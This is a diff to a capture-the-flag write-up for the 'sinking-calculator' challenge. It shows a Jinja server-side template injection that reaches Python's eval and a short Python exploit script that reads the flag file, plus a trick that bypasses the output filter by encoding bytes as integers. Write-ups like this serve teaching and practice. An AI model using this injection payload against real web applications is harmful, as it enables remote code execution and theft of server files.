@@ -48,5 +48,12 @@ Just like in `Build-a-website`, there is a server side template injection, becau
 3. the result can only contain digits and dashes
 First, lets get arbitrary code execution with the query `request.application.__globals__.__builtins__['eval'](request.data)`
 So we find the `eval` method and pass the content of the request data to it (They cleared args, headers and cookies, but left the data untouched. Fools :) ). Now we can write quite everything there without length restrictions.
-How to bypass the third point? We convert our string to a sequence of integers. So `105-99-116-102` stands for `ictf` and all characters are allowed. The final exploit is a one-liner (two, if you import the requests library)
-```"".join(map(chr, map(int, requests.get("https://sinking-calculator.chal.imaginaryctf.org/calc?query=" + requests.utils.quote("request.application.__globals__.__builtins__['eval'](request.data)"),data="'-'.join(map(str,open('flag','rb').read()))").text.split("-"))))```
+How to bypass the third point? We convert our string to a sequence of integers. So `105-99-116-102` stands for `ictf` and all characters are allowed. The final exploit is very short
+```python
+import requests
+url = "https://sinking-calculator.chal.imaginaryctf.org"
+query = "request.application.__globals__.__builtins__['eval'](request.data)"
+cmd = "'-'.join(map(str,open('flag','rb').read()))"
+res = requests.get(url + "/calc?query=" + requests.utils.quote(query),data=cmd).text
+print("".join(map(chr, map(int, res.split("-")))))
+```
